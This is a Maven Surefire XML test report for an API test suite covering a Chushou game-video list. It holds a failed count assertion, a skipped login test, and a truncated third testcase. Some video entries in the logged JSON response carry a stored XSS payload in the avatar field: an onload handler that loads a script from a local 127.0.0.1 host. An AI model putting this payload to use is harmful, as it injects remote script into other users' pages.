<?xml version="1.0" encoding="UTF-8"?>
<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report.xsd" name="com.emma.app.my_rest_test.ChushouSDKApiTest" time="3.426" tests="3" errors="0" skipped="1" failures="2">
  <properties>
[...]
</properties>
  <testcase name="testGameVideoList" classname="com.emma.app.my_rest_test.ChushouSDKApiTest" time="1.398">
    <failure message="1 expectation failed.&#10;Response body doesn&apos;t match expectation.&#10;Expected: a string containing &quot;12652&quot;&#10;  Actual: {&quot;code&quot;:0,&quot;message&quot;:&quot;&quot;,&quot;data&quot;:{&quot;count&quot;:12658,&quot;items&quot;:[{&quot;type&quot;:3,&quot;name&quot;:&quot;天天酷跑天義测评炫动战车&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;&quot;,&quot;targetKey&quot;:&quot;19&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;04:03&quot;,&quot;playCount&quot;:705648,&quot;creator&quot;:&quot;ppppppppppp&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:10475,&quot;createdTime&quot;:1442933743000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg&quot;,&quot;commentCount&quot;:26}},{&quot;type&quot;:3,&quot;name&quot;:&quot;你们要的修改方法叫我雷锋【天義作品】浪花走一走&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/214585/1442936788912.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;24&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;03:58&quot;,&quot;playCount&quot;:69794,&quot;creator&quot;:&quot;485&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;giftCount&quot;:110,&quot;createdTime&quot;:1442936971000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\&quot; onload=\&quot;with(document)body.appendChild(createElement(&apos;script&apos;)).src=&apos;http://127.0.0.1:8070/js/xss.js&apos;\&quot;&quot;,&quot;commentCount&quot;:125}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：花钱秒满所有碎片宝物！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443068522539.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;84&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;13:37&quot;,&quot;playCount&quot;:68325,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:10050,&quot;createdTime&quot;:1443068698000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:254}},{&quot;type&quot;:3,&quot;name&quot;:&quot;王冕：教你如何高概率获得积分雨&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/270113/1443112616493_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;97&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;09:48&quot;,&quot;playCount&quot;:40576,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443112640000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:130}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：嗓子中毒了也要风骚！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;&quot;,&quot;targetKey&quot;:&quot;87&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;25:49&quot;,&quot;playCount&quot;:28834,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443072888000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:132}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：完美侍女-完美评测！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443000797136.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;51&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;12:32&quot;,&quot;playCount&quot;:22437,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443001613000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:69}},{&quot;type&quot;:3,&quot;name&quot;:&quot;美兔组合：小兔说要陪我一起卖肥皂！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443521068664.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;185&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;06:48&quot;,&quot;playCount&quot;:21628,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:33,&quot;createdTime&quot;:1443521778000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:54}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：酷跑2周年-充钱秒杀所有装备！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442947729046_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;38&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;40:03&quot;,&quot;playCount&quot;:20303,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1442981524000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:99}},{&quot;type&quot;:3,&quot;name&quot;:&quot;美兔组合：小兔居然是美少女的化身！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443520976140.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;184&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;06:23&quot;,&quot;playCount&quot;:17595,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443521775000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:6}},{&quot;type&quot;:3,&quot;name&quot;:&quot;天義∶白马大圣闹闹这分数不要不要的&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/214585/1443375291729.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;149&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;04:04&quot;,&quot;playCount&quot;:15973,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443375403000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:39}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：白龙马7千米爆分秀！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442943878780_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;32&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;10:15&quot;,&quot;playCount&quot;:13631,&quot;creator&quot;:&quot;485&quot;,&quot;gender&quot;:&quot;female&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1442947437000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\&quot; onload=\&quot;with(document)body.appendChild(createElement(&apos;script&apos;)).src=&apos;http://127.0.0.1:8070/js/xss.js&apos;\&quot;&quot;,&quot;commentCount&quot;:28}},{&quot;type&quot;:3,&quot;name&quot;:&quot;天義∶积分雨怎么来的仔细看30秒的时候~&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/214585/1443756523512.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;276&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;01:34&quot;,&quot;playCount&quot;:12612,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443756551000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:11}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：超能少年碎片-全部秒满级！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443000726614.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;49&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;13:10&quot;,&quot;playCount&quot;:11184,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443001588000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:27}},{&quot;type&quot;:3,&quot;name&quot;:&quot;勇气大陆第30关经典三星过关&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443372312906.png!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;147&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;01:30&quot;,&quot;playCount&quot;:10305,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443372431000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:11}},{&quot;type&quot;:3,&quot;name&quot;:&quot;好好看&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/171/1447392587015.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;11746&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;00:15&quot;,&quot;playCount&quot;:10006,&quot;creator&quot;:&quot;用户_171&quot;,&quot;gender&quot;:&quot;male&quot;,&quot;giftCount&quot;:12123,&quot;createdTime&quot;:1447392594000,&quot;avatar&quot;:&quot;http://kascdn.kascend.com/jellyfish/avatar/20160630/171_1467278870639.jpg&quot;,&quot;commentCount&quot;:2}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥：疯狂花钻石-秒宝物碎片！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1442999740013.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;50&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;10:38&quot;,&quot;playCount&quot;:9196,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443001611000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:36}},{&quot;type&quot;:3,&quot;name&quot;:&quot;天義∶下次卡无限钥匙理解一下这次没时间 猪大家国庆节快乐&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/214585/1443684567470.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;248&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;07:12&quot;,&quot;playCount&quot;:7340,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443684593000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:9}},{&quot;type&quot;:3,&quot;name&quot;:&quot;美兔组合：咱们的酷跑一直都在！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443521046527.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;183&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;05:10&quot;,&quot;playCount&quot;:5586,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:5315,&quot;createdTime&quot;:1443521772000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:10}},{&quot;type&quot;:3,&quot;name&quot;:&quot;小美哥献唱：夜曲，难听也要说好听！&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/202338/1443001787624.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;52&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;01:45&quot;,&quot;playCount&quot;:5496,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:10,&quot;createdTime&quot;:1443001894000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:99}},{&quot;type&quot;:3,&quot;name&quot;:&quot;勇士大陆26关一命三星闯关。&quot;,&quot;style&quot;:5,&quot;cover&quot;:&quot;http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443284993692_crop.jpg!jellyfishnavstyle1&quot;,&quot;targetKey&quot;:&quot;125&quot;,&quot;meta&quot;:{&quot;duration&quot;:&quot;02:20&quot;,&quot;playCount&quot;:5120,&quot;creator&quot;:&quot;用户不存在&quot;,&quot;gender&quot;:&quot;unknow&quot;,&quot;giftCount&quot;:0,&quot;createdTime&quot;:1443285063000,&quot;avatar&quot;:&quot;&quot;,&quot;commentCount&quot;:9}}],&quot;breakpoint&quot;:&quot;125-5120&quot;}}&#10;" type="java.lang.AssertionError">java.lang.AssertionError: 
1 expectation failed.
Response body doesn't match expectation.
Expected: a string containing "12652"
  Actual: {"code":0,"message":"","data":{"count":12658,"items":[{"type":3,"name":"天天酷跑天義测评炫动战车","style":5,"cover":"","targetKey":"19","meta":{"duration":"04:03","playCount":705648,"creator":"ppppppppppp","gender":"male","giftCount":10475,"createdTime":1442933743000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":26}},{"type":3,"name":"你们要的修改方法叫我雷锋【天義作品】浪花走一走","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1442936788912.jpg!jellyfishnavstyle1","targetKey":"24","meta":{"duration":"03:58","playCount":69794,"creator":"485","gender":"female","giftCount":110,"createdTime":1442936971000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":125}},{"type":3,"name":"小美哥：花钱秒满所有碎片宝物！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443068522539.jpg!jellyfishnavstyle1","targetKey":"84","meta":{"duration":"13:37","playCount":68325,"creator":"用户不存在","gender":"unknow","giftCount":10050,"createdTime":1443068698000,"avatar":"","commentCount":254}},{"type":3,"name":"王冕：教你如何高概率获得积分雨","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/270113/1443112616493_crop.jpg!jellyfishnavstyle1","targetKey":"97","meta":{"duration":"09:48","playCount":40576,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443112640000,"avatar":"","commentCount":130}},{"type":3,"name":"小美哥：嗓子中毒了也要风骚！","style":5,"cover":"","targetKey":"87","meta":{"duration":"25:49","playCount":28834,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443072888000,"avatar":"","commentCount":132}},{"type":3,"name":"小美哥：完美侍女-完美评测！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000797136.jpg!jellyfishnavstyle1","targetKey":"51","meta":{"duration":"12:32","playCount":22437,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001613000,"avatar":"","commentCount":69}},{"type":3,"name":"美兔组合：小兔说要陪我一起卖肥皂！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521068664.jpg!jellyfishnavstyle1","targetKey":"185","meta":{"duration":"06:48","playCount":21628,"creator":"用户不存在","gender":"unknow","giftCount":33,"createdTime":1443521778000,"avatar":"","commentCount":54}},{"type":3,"name":"小美哥：酷跑2周年-充钱秒杀所有装备！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442947729046_crop.jpg!jellyfishnavstyle1","targetKey":"38","meta":{"duration":"40:03","playCount":20303,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442981524000,"avatar":"","commentCount":99}},{"type":3,"name":"美兔组合：小兔居然是美少女的化身！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443520976140.jpg!jellyfishnavstyle1","targetKey":"184","meta":{"duration":"06:23","playCount":17595,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443521775000,"avatar":"","commentCount":6}},{"type":3,"name":"天義∶白马大圣闹闹这分数不要不要的","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443375291729.jpg!jellyfishnavstyle1","targetKey":"149","meta":{"duration":"04:04","playCount":15973,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443375403000,"avatar":"","commentCount":39}},{"type":3,"name":"小美哥：白龙马7千米爆分秀！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442943878780_crop.jpg!jellyfishnavstyle1","targetKey":"32","meta":{"duration":"10:15","playCount":13631,"creator":"485","gender":"female","giftCount":0,"createdTime":1442947437000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":28}},{"type":3,"name":"天義∶积分雨怎么来的仔细看30秒的时候~","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443756523512.jpg!jellyfishnavstyle1","targetKey":"276","meta":{"duration":"01:34","playCount":12612,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443756551000,"avatar":"","commentCount":11}},{"type":3,"name":"小美哥：超能少年碎片-全部秒满级！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000726614.jpg!jellyfishnavstyle1","targetKey":"49","meta":{"duration":"13:10","playCount":11184,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001588000,"avatar":"","commentCount":27}},{"type":3,"name":"勇气大陆第30关经典三星过关","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443372312906.png!jellyfishnavstyle1","targetKey":"147","meta":{"duration":"01:30","playCount":10305,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443372431000,"avatar":"","commentCount":11}},{"type":3,"name":"好好看","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/171/1447392587015.jpg!jellyfishnavstyle1","targetKey":"11746","meta":{"duration":"00:15","playCount":10006,"creator":"用户_171","gender":"male","giftCount":12123,"createdTime":1447392594000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/20160630/171_1467278870639.jpg","commentCount":2}},{"type":3,"name":"小美哥：疯狂花钻石-秒宝物碎片！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1442999740013.jpg!jellyfishnavstyle1","targetKey":"50","meta":{"duration":"10:38","playCount":9196,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001611000,"avatar":"","commentCount":36}},{"type":3,"name":"天義∶下次卡无限钥匙理解一下这次没时间 猪大家国庆节快乐","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443684567470.jpg!jellyfishnavstyle1","targetKey":"248","meta":{"duration":"07:12","playCount":7340,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443684593000,"avatar":"","commentCount":9}},{"type":3,"name":"美兔组合：咱们的酷跑一直都在！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521046527.jpg!jellyfishnavstyle1","targetKey":"183","meta":{"duration":"05:10","playCount":5586,"creator":"用户不存在","gender":"unknow","giftCount":5315,"createdTime":1443521772000,"avatar":"","commentCount":10}},{"type":3,"name":"小美哥献唱：夜曲，难听也要说好听！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443001787624.jpg!jellyfishnavstyle1","targetKey":"52","meta":{"duration":"01:45","playCount":5496,"creator":"用户不存在","gender":"unknow","giftCount":10,"createdTime":1443001894000,"avatar":"","commentCount":99}},{"type":3,"name":"勇士大陆26关一命三星闯关。","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443284993692_crop.jpg!jellyfishnavstyle1","targetKey":"125","meta":{"duration":"02:20","playCount":5120,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443285063000,"avatar":"","commentCount":9}}],"breakpoint":"125-5120"}}

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testGameVideoList(ChushouSDKApiTest.java:60)
</failure>
    <system-out><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.9.0
Date: Fri, 09 Sep 2016 01:05:26 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 7644
Connection: keep-alive
Set-Cookie: _i7=965a2894650347fba4465e8e26d48886; Expires=Mon, 15-Apr-2019 01:05:26 GMT; Path=/; HttpOnly

{"code":0,"message":"","data":{"count":12658,"items":[{"type":3,"name":"天天酷跑天義测评炫动战车","style":5,"cover":"","targetKey":"19","meta":{"duration":"04:03","playCount":705648,"creator":"ppppppppppp","gender":"male","giftCount":10475,"createdTime":1442933743000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160721/1469072354385.jpg","commentCount":26}},{"type":3,"name":"你们要的修改方法叫我雷锋【天義作品】浪花走一走","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1442936788912.jpg!jellyfishnavstyle1","targetKey":"24","meta":{"duration":"03:58","playCount":69794,"creator":"485","gender":"female","giftCount":110,"createdTime":1442936971000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":125}},{"type":3,"name":"小美哥：花钱秒满所有碎片宝物！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443068522539.jpg!jellyfishnavstyle1","targetKey":"84","meta":{"duration":"13:37","playCount":68325,"creator":"用户不存在","gender":"unknow","giftCount":10050,"createdTime":1443068698000,"avatar":"","commentCount":254}},{"type":3,"name":"王冕：教你如何高概率获得积分雨","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/270113/1443112616493_crop.jpg!jellyfishnavstyle1","targetKey":"97","meta":{"duration":"09:48","playCount":40576,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443112640000,"avatar":"","commentCount":130}},{"type":3,"name":"小美哥：嗓子中毒了也要风骚！","style":5,"cover":"","targetKey":"87","meta":{"duration":"25:49","playCount":28834,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443072888000,"avatar":"","commentCount":132}},{"type":3,"name":"小美哥：完美侍女-完美评测！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000797136.jpg!jellyfishnavstyle1","targetKey":"51","meta":{"duration":"12:32","playCount":22437,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001613000,"avatar":"","commentCount":69}},{"type":3,"name":"美兔组合：小兔说要陪我一起卖肥皂！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521068664.jpg!jellyfishnavstyle1","targetKey":"185","meta":{"duration":"06:48","playCount":21628,"creator":"用户不存在","gender":"unknow","giftCount":33,"createdTime":1443521778000,"avatar":"","commentCount":54}},{"type":3,"name":"小美哥：酷跑2周年-充钱秒杀所有装备！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442947729046_crop.jpg!jellyfishnavstyle1","targetKey":"38","meta":{"duration":"40:03","playCount":20303,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1442981524000,"avatar":"","commentCount":99}},{"type":3,"name":"美兔组合：小兔居然是美少女的化身！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443520976140.jpg!jellyfishnavstyle1","targetKey":"184","meta":{"duration":"06:23","playCount":17595,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443521775000,"avatar":"","commentCount":6}},{"type":3,"name":"天義∶白马大圣闹闹这分数不要不要的","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443375291729.jpg!jellyfishnavstyle1","targetKey":"149","meta":{"duration":"04:04","playCount":15973,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443375403000,"avatar":"","commentCount":39}},{"type":3,"name":"小美哥：白龙马7千米爆分秀！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/202338/1442943878780_crop.jpg!jellyfishnavstyle1","targetKey":"32","meta":{"duration":"10:15","playCount":13631,"creator":"485","gender":"female","giftCount":0,"createdTime":1442947437000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/160602/1464819886505.JPG\" onload=\"with(document)body.appendChild(createElement('script')).src='http://127.0.0.1:8070/js/xss.js'\"","commentCount":28}},{"type":3,"name":"天義∶积分雨怎么来的仔细看30秒的时候~","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443756523512.jpg!jellyfishnavstyle1","targetKey":"276","meta":{"duration":"01:34","playCount":12612,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443756551000,"avatar":"","commentCount":11}},{"type":3,"name":"小美哥：超能少年碎片-全部秒满级！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443000726614.jpg!jellyfishnavstyle1","targetKey":"49","meta":{"duration":"13:10","playCount":11184,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001588000,"avatar":"","commentCount":27}},{"type":3,"name":"勇气大陆第30关经典三星过关","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443372312906.png!jellyfishnavstyle1","targetKey":"147","meta":{"duration":"01:30","playCount":10305,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443372431000,"avatar":"","commentCount":11}},{"type":3,"name":"好好看","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/171/1447392587015.jpg!jellyfishnavstyle1","targetKey":"11746","meta":{"duration":"00:15","playCount":10006,"creator":"用户_171","gender":"male","giftCount":12123,"createdTime":1447392594000,"avatar":"http://kascdn.kascend.com/jellyfish/avatar/20160630/171_1467278870639.jpg","commentCount":2}},{"type":3,"name":"小美哥：疯狂花钻石-秒宝物碎片！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1442999740013.jpg!jellyfishnavstyle1","targetKey":"50","meta":{"duration":"10:38","playCount":9196,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443001611000,"avatar":"","commentCount":36}},{"type":3,"name":"天義∶下次卡无限钥匙理解一下这次没时间 猪大家国庆节快乐","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/214585/1443684567470.jpg!jellyfishnavstyle1","targetKey":"248","meta":{"duration":"07:12","playCount":7340,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443684593000,"avatar":"","commentCount":9}},{"type":3,"name":"美兔组合：咱们的酷跑一直都在！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443521046527.jpg!jellyfishnavstyle1","targetKey":"183","meta":{"duration":"05:10","playCount":5586,"creator":"用户不存在","gender":"unknow","giftCount":5315,"createdTime":1443521772000,"avatar":"","commentCount":10}},{"type":3,"name":"小美哥献唱：夜曲，难听也要说好听！","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/202338/1443001787624.jpg!jellyfishnavstyle1","targetKey":"52","meta":{"duration":"01:45","playCount":5496,"creator":"用户不存在","gender":"unknow","giftCount":10,"createdTime":1443001894000,"avatar":"","commentCount":99}},{"type":3,"name":"勇士大陆26关一命三星闯关。","style":5,"cover":"http://kascdn.kascend.com/jellyfish/game/video/screenshot/275297/1443284993692_crop.jpg!jellyfishnavstyle1","targetKey":"125","meta":{"duration":"02:20","playCount":5120,"creator":"用户不存在","gender":"unknow","giftCount":0,"createdTime":1443285063000,"avatar":"","commentCount":9}}],"breakpoint":"125-5120"}}
]]></system-out>
    <system-err><![CDATA[log4j:WARN No appenders could be found for logger (org.apache.http.impl.conn.BasicClientConnectionManager).
log4j:WARN Please initialize the log4j system properly.
log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
]]></system-err>
  </testcase>
  <testcase name="testLogin" classname="com.emma.app.my_rest_test.ChushouSDKApiTest" time="0">
    <skipped message="org.dom4j.DocumentException: D:\workspace\my-rest-test\target\LoginTest (系统找不到指定的文件。) Nested exception: D:\workspace\my-rest-test\target\LoginTest (系统找不到指定的文件。)"/>
    <system-out><![CDATA[@DataProvider(name='loginData')
dataProvidertestLogin
]]></system-out>
  </testcase>
  <testcase name="testOnlineVideoList" classname="com.emma.app.my_rest_test.ChushouSDKApiTest" time="0.627">
